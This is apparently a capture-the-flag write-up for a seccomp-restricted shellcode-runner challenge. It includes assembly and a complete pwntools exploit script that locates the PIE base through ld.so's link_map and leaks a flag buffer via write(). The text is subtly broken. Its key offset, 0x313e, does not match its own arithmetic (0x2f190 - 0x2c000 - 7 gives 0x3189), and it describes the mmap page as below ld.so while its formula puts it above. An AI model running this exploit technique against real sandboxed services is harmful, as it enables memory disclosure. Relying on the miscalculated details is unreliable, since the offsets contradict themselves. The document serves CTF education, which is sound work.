# CyLab — SaaS (Shellcode as a Service)

* **Platform:** CyLab Security Academy / picoMini by redpwn (Challenge ID: `213`)
* **Category:** Binary Exploitation / Constrained Shellcoding & Seccomp Bypass (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB, Linux Linker Internals
* **Binary:** `chall` (64-bit x86_64 ELF)

---

## TL;DR

The challenge hosts a "Shellcode as a Service" runner. Before executing user-supplied shellcode on an `mmap` RWX page, the binary enforces two strict constraints: (1) a Seccomp filter permits only `write(fd=1)`, `exit`, and `exit_group`, blocking all `open`/`read`/`execve` calls; (2) all general-purpose registers (`rax` through `r15`, including `rsp` and `rbp`) are wiped to zero. However, `flag.txt` has already been loaded into a global variable (`flag`) in the binary at PIE offset `+0x202060`. Because anonymous `mmap` pages are allocated adjacent to the dynamic linker (`ld.so`), we use **RIP-relative addressing** (`lea rax, [rip + 0x313e]`) to locate `_rtld_global._dl_ns[0]._ns_loaded->l_addr` inside `ld.so`. Dereferencing this pointer recovers the executable's PIE base, enabling a direct `sys_write(1, &flag, 64)` syscall to disclose the flag.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., not stripped

$ checksec --file=chall
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Key observations:
1. **Full Mitigations + Seccomp:** Full RELRO, Canary, NX, and PIE are all enabled. A strict Seccomp BPF sandbox restricts syscalls.
2. **Registers Sanitized to Zero:** Prior to calling the shellcode buffer, the harness executes:
   ```asm
   xor rax, rax; xor rbx, rbx; xor rcx, rcx; ... ; xor r15, r15
   jmp mmap_page
   ```
3. **Preloaded Flag in Memory:** The binary reads `flag.txt` into `.bss` symbol `flag` (`0x202060` bytes from PIE base) during startup.

---

## Static Analysis & Vulnerability

### 1. Seccomp Filter Analysis

Using `seccomp-tools`:

```text
 line  OP   JT   JF   K
=================================
 0000: A = sys_number
 0001: if (A == write) goto 0004
 0002: if (A == exit) goto 0006
 0003: if (A == exit_group) goto 0006
 0004: A = args[0]
 0005: if (A == 1) goto 0006 else goto 0007
 0006: return ALLOW
 0007: return KILL
```

Only `sys_write(1, buf, len)` and process termination are permitted.

### 2. The Linker Memory Topology

Since all registers are initialized to zero, we have no stack pointer (`rsp = 0`) and no known base pointers. However, `rip` points directly into our executed `mmap` page.

In Linux AMD64 ASLR implementations:
- An anonymous `mmap` allocation (`mmap_rwx`) without a fixed base is assigned virtual memory in the memory mapping segment right below the dynamic linker `ld-linux-x86-64.so.2`.
- On the host environment, the distance between `mmap_rwx` and `ld.so` is static:
  $$\text{rwx\_page} = \text{ld\_base} + 0\text{x}2\text{c}000$$
- In `ld.so`, the primary link map list `_rtld_global._dl_ns[0]._ns_loaded` resides at offset `ld_base + 0x2f190`.
- The first 8-byte field of `struct link_map` is `l_addr`—the runtime base address of the main executable!

```text
       mmap_rwx Memory Page (rip points here):
       +-----------------------------------------------+
       |  Shellcode: lea rax, [rip + 0x313e]           |
       +-----------------------------------------------+
                             |
                             v  (Offset = 0x2f190 - 0x2c000 - 0x07 = 0x313e)
       ld.so Internal Structure (_rtld_global):
       +-----------------------------------------------+  ld_base + 0x2f190
       |  l_addr (Main PIE Base Address)               |
       +-----------------------------------------------+
                             |
                             v  (Dereferenced into rsi)
       Main Binary (.bss segment):
       +-----------------------------------------------+  PIE Base + 0x202060
       |  Preloaded Flag Buffer: "picoCTF{...}"        |
       +-----------------------------------------------+
```

Delta calculation:
$$\text{Offset} = (\text{ld\_base} + 0\text{x}2\text{f}190) - (\text{mmap\_rwx} + 7) = 0\text{x}313\text{e}$$

---

## Dynamic Analysis & Exploitation Strategy

1. **RIP-Relative Linker Resolution:**
   ```asm
   lea rax, [rip]              ; rax = instruction address + 7
   add rax, 0x313e             ; rax = &l_addr inside ld.so
   mov rsi, [rax]              ; rsi = PIE base of main executable
   ```
2. **Flag Address Calculation:**
   ```asm
   add rsi, 0x202060           ; rsi = &flag
   ```
3. **Triggering `write(1, &flag, 64)`:**
   ```asm
   mov rdi, 1                  ; stdout
   mov rdx, 64                 ; count = 64 bytes
   mov rax, 1                  ; __NR_write
   syscall
   ```
4. **Clean Exit:**
   ```asm
   mov rax, 60                 ; __NR_exit
   xor edi, edi
   syscall
   ```

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "chatelaine.cylabacademy.net", 33414
FLAG_OFF = 0x202060   # Offset of flag buffer from PIE base
SLOT_OFF = 0x313e     # Delta from [rip+7] to ld.so link_map l_addr

# Standalone position-independent shellcode
SHELLCODE = asm(f"""
    lea rax, [rip]
    add rax, {SLOT_OFF}         /* rax = &l_addr in ld.so */
    mov rsi, [rax]              /* rsi = PIE base */
    add rsi, {FLAG_OFF}         /* rsi = &flag */
    mov rdi, 1                  /* fd = stdout */
    mov rdx, 64                 /* size = 64 bytes */
    mov rax, 1                  /* sys_write */
    syscall

    mov rax, 60                 /* sys_exit */
    xor edi, edi
    syscall
""")

def solve(io):
    io.sendafter(b"Welcome to Shellcode as a Service!\n", SHELLCODE)
    data = io.recvall(timeout=4)
    m = re.search(rb"(academy\{[^}]+\}|picoCTF\{[^}]+\})", data)
    if m:
        log.success(f"Flag captured: {m.group(1).decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to chatelaine.cylabacademy.net on port 33414: Done
[+] Flag captured: picoCTF{redacted}
[*] Closed connection to chatelaine.cylabacademy.net port 33414
```

---

## Key Takeaways & Lessons

1. **Relative Memory Invariants Under ASLR:** While ASLR randomizes the base address of individual libraries independently, allocations made in sequence (such as `mmap` buffers and dynamic linker mappings) maintain constant relative distances within the runtime address space.
2. **Defeating Zeroed Registers via RIP-Relative Addressing:** When compilers or harnesses zero all general-purpose registers, the instruction pointer `rip` provides the sole anchor for self-locating code and referencing adjacent memory structures.
3. **The `_rtld_global` Link Map in `ld.so`:** The dynamic linker maintains a permanent list of loaded ELF objects (`link_map`). Reading `l_addr` from the head of this list recovers the base address of PIE executables without requiring stack or register leaks.
